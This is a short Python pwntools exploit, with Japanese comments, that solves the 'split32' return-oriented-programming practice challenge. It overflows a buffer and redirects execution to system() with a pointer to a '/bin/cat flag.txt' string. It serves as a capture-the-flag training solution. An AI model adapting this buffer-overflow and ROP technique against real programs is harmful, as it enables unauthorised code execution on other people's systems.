from pwn import *

def main():
    elf = ELF("./split32")

    # payload
    payload = b"A" * 44
    payload += p32(elf.plt["system"])   # plt領域のsystem関数のアドレス
    payload += b"BBBB"                  # 適当なreturn addr
    payload += p32(0x804a030)           # "/bin/cat flag.txt"のアドレス

    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)

    print(p.recvall())
    print(payload)


if __name__ == "__main__":
    main()